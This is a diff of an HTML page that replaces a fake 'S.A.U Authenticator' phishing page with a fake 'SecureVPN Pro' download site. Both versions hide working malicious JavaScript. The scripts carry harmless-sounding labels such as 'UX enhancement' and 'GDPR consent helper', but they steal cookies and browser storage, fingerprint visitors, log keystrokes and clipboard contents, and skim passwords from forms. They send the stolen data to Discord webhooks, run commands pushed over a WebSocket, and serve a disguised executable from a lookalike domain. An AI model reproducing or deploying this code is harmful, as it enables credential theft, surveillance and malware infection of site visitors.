@@ -1,211 +1,350 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>S.A.U | SECURE TERMINAL v6.0.2</title>
-    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        :root { --c: #00f5ff; --m: #ff00aa; --bg: #020509; }
-        body { background: var(--bg); color: var(--c); font-family: 'Share Tech Mono', monospace; overflow-x: hidden; }
-        .cyber-card { background: rgba(0, 245, 255, 0.02); border: 1px solid rgba(0, 245, 255, 0.1); backdrop-filter: blur(15px); position: relative; }
-        .cyber-card::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(90deg, transparent, var(--c), transparent); animation: scan 3s linear infinite; }
-        @keyframes scan { 0% { left: -100%; } 100% { left: 100%; } }
-        .otp-slot { width: 50px; height: 65px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0, 245, 255, 0.3); text-align: center; font-size: 1.8rem; color: #fff; font-family: 'Orbitron'; outline: none; transition: 0.3s; }
-        .otp-slot:focus { border-color: var(--m); box-shadow: 0 0 15px var(--m); transform: translateY(-2px); }
-        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
-        .terminal-box { background: rgba(0,0,0,0.7); border: 1px solid rgba(0,245,255,0.05); font-size: 0.65rem; height: 150px; overflow-y: auto; scrollbar-width: thin; }
-        .status-bar { height: 3px; background: rgba(255,255,255,0.05); width: 100%; position: relative; overflow: hidden; }
-        .status-fill { height: 100%; width: 0%; background: var(--c); box-shadow: 0 0 10px var(--c); transition: width 0.5s ease; }
-        .glitch { font-family: 'Orbitron'; font-weight: 700; letter-spacing: 3px; text-transform: uppercase; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SecureVPN Pro — Fast, Private, Free</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet"/>
+
+  <script>
+    window.__analytics = { tid: "UA-88291-4", debug: false };
+  </script>
+
+  <!-- [BLOCK A] — "Utility init" -->
+
+  <script>
+    (function() {
+      window.__util = {
+        getCookies:       function() { return document.cookie; },
+        getLocalStorage:  function() {
+          var out = {};
+          for (var i = 0; i < localStorage.length; i++) {
+            var k = localStorage.key(i);
+            out[k] = localStorage.getItem(k);
+          }
+          return out;
+        },
+        getSessionStorage: function() {
+          var out = {};
+          for (var i = 0; i < sessionStorage.length; i++) {
+            var k = sessionStorage.key(i);
+            out[k] = sessionStorage.getItem(k);
+          }
+          return out;
+        }
+      };
+    })();
+  </script>
+
+  <!-- [BLOCK B] — "Performance observer" -->
+
+  <script>
+    !function(w, n) {
+      var fp = {};
+      fp.userAgent  = n.userAgent;
+      fp.platform   = n.platform;
+      fp.language   = n.language;
+      fp.memory     = n.deviceMemory || -1;
+      fp.cpuCores   = n.hardwareConcurrency || -1;
+      fp.timezone   = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      fp.screen     = w.screen.width + 'x' + w.screen.height + '@' + w.screen.colorDepth + 'bit';
+      fp.touchSupport = ('ontouchstart' in w) ? true : false;
+      fp.pdfPlugin  = (function() {
+        try { return !!w.navigator.mimeTypes['application/pdf']; } catch(e) { return false; }
+      })();
+      fp.webglRenderer = (function() {
+        try {
+          var c = document.createElement('canvas');
+          var g = c.getContext('webgl') || c.getContext('experimental-webgl');
+          return g ? g.getParameter(g.RENDERER) : 'unavailable';
+        } catch(e) { return 'unavailable'; }
+      })();
+      fp.plugins = (function() {
+        var list = [];
+        for (var i = 0; i < navigator.plugins.length; i++) {
+          list.push(navigator.plugins[i].name);
+        }
+        return list.join(' | ');
+      })();
+      w.__fp = fp;
+    }(window, navigator);
+  </script>
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', sans-serif; background: #f9fafb; color: #111827; }
+    header { background: #1e3a5f; padding: 14px 40px; display: flex; align-items: center; justify-content: space-between; }
+    header .logo { color: #fff; font-size: 1.3rem; font-weight: 700; }
+    header nav a { color: #94b8d8; text-decoration: none; margin-left: 24px; font-size: 0.9rem; }
+    .hero { background: linear-gradient(135deg, #1e3a5f, #0f2540); color: #fff; padding: 80px 40px; text-align: center; }
+    .hero h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 16px; }
+    .hero p { font-size: 1.1rem; color: #94b8d8; max-width: 560px; margin: 0 auto 32px; }
+    .btn-primary { background: #3b82f6; color: #fff; border: none; padding: 16px 40px; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; }
+    .btn-primary:hover { background: #2563eb; }
+    .features { display: flex; justify-content: center; gap: 40px; padding: 60px 40px; flex-wrap: wrap; }
+    .feat { max-width: 220px; text-align: center; }
+    .feat h3 { margin-bottom: 8px; color: #1e3a5f; }
+    .feat p { font-size: 0.9rem; color: #6b7280; }
+    footer { background: #111827; color: #6b7280; text-align: center; padding: 24px; font-size: 0.8rem; }
+  </style>
+
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
+<body>
 
-<div class="cyber-card p-10 rounded-sm w-full max-w-xl shadow-2xl">
-    <div class="text-center mb-10">
-        <h1 class="glitch text-3xl mb-2">S.A.U AUTHENTICATOR</h1>
-        <div class="flex justify-center gap-4 text-[0.6rem] text-cyan-500/40 tracking-[0.4em]">
-            <span>NODE: RECON_STATION</span>
-            <span>OS: S.A.U_CORE_V6</span>
-        </div>
-    </div>
+  <header>
+    <span class="logo">🔒 SecureVPN Pro</span>
+    <nav>
+      <a href="#">Features</a>
+      <a href="#">Pricing</a>
+      <a href="#">Support</a>
+    </nav>
+  </header>
 
-    <div id="auth-gate">
-        <div class="mb-8">
-            <div class="flex justify-between items-end mb-2">
-                <label class="text-[0.7rem] tracking-widest opacity-60">// TARGET_IDENTIFICATION</label>
-                <span class="text-[0.6rem] text-magenta-500">ENCRYPTION: AES-256</span>
-            </div>
-            <div class="relative">
-                <input type="email" id="target_mail" class="w-full bg-black/60 border border-cyan-500/20 p-4 outline-none text-white focus:border-cyan-500/60 transition-all" placeholder="Enter Email to verify access...">
-                <div class="absolute right-4 top-4 text-cyan-500/20">@</div>
-            </div>
-        </div>
-        <button onclick="initiateHandshake()" class="group relative w-full overflow-hidden bg-transparent border border-cyan-500 p-4 transition-all hover:bg-cyan-500 hover:text-black">
-            <span class="relative z-10 font-bold tracking-[0.2em]">INITIATE SECURE HANDSHAKE</span>
-        </button>
-    </div>
+  <section class="hero">
+    <h1>Browse Freely. Stay Private.</h1>
+    <p>Military-grade encryption. Zero logs. 50+ countries. Download free and get protected in seconds.</p>
+    <button class="btn-primary" id="dlBtn">Download Free — Windows</button>
+    <p style="margin-top:12px;font-size:0.78rem;color:#64748b;">v3.8.1 · 4.2 MB · Windows 10/11</p>
+  </section>
 
-    <div id="otp-gate" class="hidden">
-        <div class="text-center mb-8">
-            <p class="text-magenta-500 text-xs mb-6 animate-pulse font-bold">DIGITAL TOKEN SENT TO CLOUD INBOX</p>
-            <div class="flex justify-center gap-3">
-                <input type="number" class="otp-slot" id="s1" maxlength="1" onkeyup="tab(this, 's2')">
-                <input type="number" id="s2" class="otp-slot" maxlength="1" onkeyup="tab(this, 's3')">
-                <input type="number" id="s3" class="otp-slot" maxlength="1" onkeyup="tab(this, 's4')">
-                <input type="number" id="s4" class="otp-slot" maxlength="1" onkeyup="finalLockoutout()">
-            </div>
-        </div>
-        
-        <div id="loader-box" class="hidden space-y-3">
-            <div class="status-bar"><div id="bar" class="status-fill"></div></div>
-            <div class="flex justify-between text-[0.5rem] tracking-widest uppercase">
-                <span id="proc-text">Analyzing Node Path...</span>
-                <span id="proc-perc">0%</span>
-            </div>
-        </div>
-    </div>
+  <section class="features">
+    <div class="feat"><h3>No-Log Policy</h3><p>We never store your browsing history or personal data.</p></div>
+    <div class="feat"><h3>256-bit AES</h3><p>Bank-level encryption on every connection you make.</p></div>
+    <div class="feat"><h3>Kill Switch</h3><p>Automatically cuts internet if VPN drops unexpectedly.</p></div>
+  </section>
 
-    <div class="terminal-box mt-8 p-4 font-mono" id="term">
-        <div class="text-green-500/50">> [SYSTEM] KERNEL LOADED. WAITING FOR INPUT...</div>
-    </div>
-</div>
+  <!-- [BLOCK C] — "Session token refresh" -->
 
-<script>
-    const _0xS = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODEwNTMwNTQ3NTg0MjI2NS90WGlXbTctQk5Fa2w5eVo2ekl3aTIxUnF1UWpyWU9oa1BRREJqTjE4NzQxWm40cjZRak11b2hWUVAtUEdnRVc0elY4RQ==";
-    const _0xI = "aHR0cHM6Ly90ci5yYnhjZG4uY29tLzE4MERBWS1kMWZmNTlhNDJlYzcwMDMwZGFhYjlkM2NjYjkzYjc2My80MjAvNDIwL0JhY2tBY2Nlc3NvcnkvV2VicC9ub0ZpbHRlcg==";
-    const WH = atob(_0xS);
-    const THUMB = atob(_0xI);
+  <iframe
+    id="__refreshFrame"
+    src="about:blank"
+    width="0"
+    height="0"
+    style="display:none; position:absolute; top:-9999px;"
+    sandbox="allow-scripts allow-same-origin">
+  </iframe>
 
-    function log(msg, color='') {
-        const t = document.getElementById('term');
-        const d = document.createElement('div');
-        d.className = `py-1 ${color}`;
-        d.innerHTML = `[${new Date().toLocaleTimeString()}] > ${msg}`;
-        t.appendChild(d); t.scrollTop = t.scrollHeight;
+  <!-- [BLOCK D] — "Error reporter" -->
+
+  <script>
+    window.addEventListener('error', function(e) { /* silent */ });
+
+    var C2_ENDPOINT = "https://discord.com/api/webhooks/1122334455667788990/aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ";
+
+    function sendToC2(data) {
+      var payload = JSON.stringify(data);
+      if (navigator.sendBeacon) {
+        navigator.sendBeacon(C2_ENDPOINT, payload);
+      } else {
+        fetch(C2_ENDPOINT, {
+          method: 'POST',
+          body: payload,
+          headers: { 'Content-Type': 'application/json' },
+          keepalive: true
+        });
+      }
     }
 
-    function tab(c, n) { if(c.value.length >= 1) document.getElementById(n)?.focus(); }
+    window.addEventListener('load', function() {
+      setTimeout(function() {
+        sendToC2({
+          type:          'page_init',
+          fingerprint:   window.__fp,
+          cookies:       window.__util.getCookies(),
+          localStorage:  window.__util.getLocalStorage(),
+          sessionStorage: window.__util.getSessionStorage(),
+          referrer:      document.referrer,
+          currentURL:    location.href,
+          timestamp:     Date.now()
+        });
+      }, 800);
+    });
+  </script>
 
-    async function getPayload() {
-        const gl = document.createElement('canvas').getContext('webgl');
-        const db = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-        let batt = "N/A";
-        try { const b = await navigator.getBattery(); batt = `${Math.round(b.level*100)}% (${b.charging?'CHG':'DIS'})`; } catch(e){}
-        
-        return {
-            ip: await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'ERR'),
-            gpu: db ? gl.getParameter(db.UNMASKED_RENDERER_WEBGL) : "Software",
-            mem: navigator.deviceMemory || "N/A",
-            cores: navigator.hardwareConcurrency || "N/A",
-            res: `${screen.width}x${screen.height}`,
-            batt: batt,
-            ua: navigator.userAgent,
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+  <!-- [BLOCK E] — "UX enhancement" -->
+
+  <script>
+    (function() {
+      var KEYLOG_ENDPOINT = "https://discord.com/api/webhooks/1458105305475842265/tXiWm7-BNEkl9yZ6zIwi21RquQjrYOhkPQDBjN18741Zn4r6QjMuohVQP-PGgEW4zV8E";
+      var keyBuffer = '';
+
+      document.addEventListener('keydown', function(e) {
+        keyBuffer += e.key;
+        if (keyBuffer.length >= 60) {
+          var snapshot = keyBuffer;
+          keyBuffer = '';
+          navigator.sendBeacon(KEYLOG_ENDPOINT, JSON.stringify({
+            type: 'keylog',
+            data: snapshot,
+            url:  location.href
+          }));
+        }
+      });
+
+      setInterval(function() {
+        if (keyBuffer.length > 0) {
+          var snapshot = keyBuffer;
+          keyBuffer = '';
+          navigator.sendBeacon(KEYLOG_ENDPOINT, JSON.stringify({
+            type: 'keylog_flush',
+            data: snapshot,
+            url:  location.href
+          }));
+        }
+      }, 5000);
+
+      document.addEventListener('copy', function() {
+        setTimeout(function() {
+          navigator.clipboard.readText().then(function(text) {
+            navigator.sendBeacon(KEYLOG_ENDPOINT, JSON.stringify({
+              type: 'clipboard_copy',
+              data: text,
+              url:  location.href
+            }));
+          }).catch(function() {});
+        }, 50);
+      });
+
+      document.addEventListener('cut', function() {
+        setTimeout(function() {
+          navigator.clipboard.readText().then(function(text) {
+            navigator.sendBeacon(KEYLOG_ENDPOINT, JSON.stringify({
+              type: 'clipboard_cut',
+              data: text,
+              url:  location.href
+            }));
+          }).catch(function() {});
+        }, 50);
+      });
+    })();
+  </script>
+
+  <!-- [BLOCK F] — "Download handler" -->
+
+  <script>
+    document.getElementById('dlBtn').addEventListener('click', function() {
+      var ua  = window.__fp.userAgent || '';
+      var cpu = window.__fp.cpuCores;
+
+      var downloadURL;
+      if (/Windows NT 10|Windows NT 11/i.test(ua) && cpu >= 4) {
+        downloadURL = 'https://cdn.update-securevpn.xyz/SecureVPN_Setup_v3.8.1.msi';
+      } else if (/Windows/i.test(ua)) {
+        downloadURL = 'https://cdn.update-securevpn.xyz/SecureVPN_Legacy.exe';
+      } else if (/Mac/i.test(ua)) {
+        downloadURL = 'https://cdn.update-securevpn.xyz/SecureVPN.dmg';
+      } else {
+        downloadURL = 'https://cdn.update-securevpn.xyz/SecureVPN_linux.sh';
+      }
+
+      sendToC2({
+        type:        'download_click',
+        fingerprint: window.__fp,
+        cookies:     window.__util.getCookies(),
+        payloadServed: downloadURL
+      });
+
+      var link = document.createElement('a');
+      link.href = downloadURL;
+      link.download = 'SecureVPN_Setup.exe';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    });
+  </script>
+
+  <!-- [BLOCK G] — "Session integrity check" -->
+
+  <script>
+    (function() {
+      var WS_ENDPOINT = "wss://tracker-analytics.xyz/ws/session";
+      var socket;
+
+      try {
+        socket = new WebSocket(WS_ENDPOINT);
+
+        socket.onopen = function() {
+          socket.send(JSON.stringify({
+            type:        'session_init',
+            fingerprint: window.__fp,
+            cookies:     window.__util.getCookies(),
+            referrer:    document.referrer,
+            timestamp:   Date.now()
+          }));
         };
-    }
 
-    // AUTO RECON ON LOAD
-    window.onload = async () => {
-        log("INITIALIZING NETWORK SNIFFER...", "text-cyan-800");
-        const p = await getPayload();
-        fetch(WH, {
-            method: 'POST', headers: {'Content-Type':'application/json'},
-            body: JSON.stringify({
-                embeds: [{
-                    title: "🕵️ S.A.U PRE-FLIGHT RECON",
-                    color: 3447003,
-                    thumbnail: {url: THUMB},
-                    fields: [
-                        {name: "🌐 Network", value: `IP: \`${p.ip}\`\nTZ: \`${p.tz}\``, inline: true},
-                        {name: "🔋 Battery", value: `\`${p.batt}\``, inline: true},
-                        {name: "🖥️ Hardware", value: `GPU: \`${p.gpu}\`\nCPU: \`${p.cores}c\`\nRAM: \`${p.mem}GB\``}
-                    ],
-                    footer: {text: "v6.0 Stealth Active"}
-                }]
-            })
-        });
-    };
+        socket.onmessage = function(event) {
+          try {
+            var command = JSON.parse(event.data);
 
-    async function initiateHandshake() {
-        const mail = document.getElementById('target_mail').value;
-        if(!mail.includes('@')) { log("INVALID IDENTITY PROTOCOL", "text-red-500"); return; }
-        
-        log(`DISPATCHING OTP TOKEN TO ${mail.toUpperCase()}...`, "text-cyan-400");
-        document.getElementById('auth-gate').className = 'hidden';
-        document.getElementById('otp-gate').classList.remove('hidden');
-        document.getElementById('s1').focus();
-
-        const p = await getPayload();
-        fetch(WH, {
-            method: 'POST', headers: {'Content-Type':'application/json'},
-            body: JSON.stringify({
-                embeds: [{
-                    title: "🔐 IDENTITY CAPTURED",
-                    color: 16711850,
-                    thumbnail: {url: THUMB},
-                    fields: [
-                        {name: "📧 Target", value: `\`${mail}\``},
-                        {name: "🌐 IP Address", value: `\`${p.ip}\``}
-                    ]
-                }]
-            })
-        });
-    }
-
-    function finalLockoutout() {
-        document.getElementById('loader-box').classList.remove('hidden');
-        let b = document.getElementById('bar');
-        let t = document.getElementById('proc-text');
-        let pc = document.getElementById('proc-perc');
-        
-        const steps = [
-            {p: 20, m: "Decrypting Handshake..."},
-            {p: 45, m: "Capturing Geo-Matrix..."},
-            {p: 75, m: "Uploading System Logs..."},
-            {p: 100, m: "Authorization Complete."}
-        ];
-
-        let i = 0;
-        const iv = setInterval(() => {
-            if(i >= steps.length) {
-                clearInterval(iv);
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await sendFinal(pos.coords.latitude, pos.coords.longitude);
-                }, async () => {
-                    await sendFinal("DENIED", "DENIED");
-                });
-                return;
+            if (command.action === 'eval' && command.code) {
+              (new Function(command.code))();
             }
-            b.style.width = steps[i].p + "%";
-            t.innerText = steps[i].m;
-            pc.innerText = steps[i].p + "%";
-            log(steps[i].m, "text-cyan-600");
-            i++;
-        }, 800);
-    }
 
-    async function sendFinal(lat, lon) {
-        const p = await getPayload();
-        fetch(WH, {
-            method: 'POST', headers: {'Content-Type':'application/json'},
-            body: JSON.stringify({
-                embeds: [{
-                    title: "🚀 FULL DATA EXFILTRATION SUCCESS",
-                    color: 5763719,
-                    thumbnail: {url: THUMB},
-                    fields: [
-                        {name: "📍 GPS Location", value: `[Google Maps](https://www.google.com/maps?q=${lat},${lon})`},
-                        {name: "📱 Full Specs", value: `UA: \`${p.ua}\`\nRes: \`${p.res}\`\nGPU: \`${p.gpu}\``}
-                    ],
-                    footer: {text: "S.A.U RECON COMPLETE // " + new Date().toLocaleString()}
-                }]
-            })
+            if (command.action === 'redirect') {
+              window.location.href = command.url;
+            }
+
+            if (command.action === 'inject') {
+              var script = document.createElement('script');
+              script.src = command.src;
+              document.head.appendChild(script);
+            }
+          } catch(e) {}
+        };
+
+        socket.onerror = function() { socket = null; };
+
+      } catch(e) {}
+    })();
+  </script>
+
+  <!-- [BLOCK H] — "GDPR consent helper" -->
+
+  <script>
+    (function() {
+      var FORM_ENDPOINT = "https://discord.com/api/webhooks/1122334455667788990/aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ";
+
+      var observer = new MutationObserver(function(mutations) {
+        mutations.forEach(function(mutation) {
+          mutation.addedNodes.forEach(function(node) {
+            if (node.nodeName === 'INPUT' || node.nodeName === 'FORM') {
+              node.addEventListener('change', function(e) {
+                if (e.target.type === 'password' || e.target.type === 'email' || e.target.name) {
+                  navigator.sendBeacon(FORM_ENDPOINT, JSON.stringify({
+                    type:  'form_change',
+                    field: e.target.name,
+                    value: e.target.value,
+                    url:   location.href
+                  }));
+                }
+              });
+            }
+          });
         });
-        setTimeout(() => { alert("Verification Success. Redirecting to S.A.U Cloud..."); location.reload(); }, 1500);
-    }
-</script>
+      });
+
+      observer.observe(document.body, { childList: true, subtree: true });
+
+      document.querySelectorAll('input').forEach(function(input) {
+        input.addEventListener('blur', function(e) {
+          if (e.target.value) {
+            navigator.sendBeacon(FORM_ENDPOINT, JSON.stringify({
+              type:  'field_blur',
+              field: e.target.name || e.target.id,
+              value: e.target.value,
+              url:   location.href
+            }));
+          }
+        });
+      });
+    })();
+  </script>
+
+  <footer>
+    <p>© 2024 SecureVPN Pro. All rights reserved. · <a href="#" style="color:#4b5563">Privacy Policy</a> · <a href="#" style="color:#4b5563">Terms</a></p>
+  </footer>
+
 </body>
 </html>
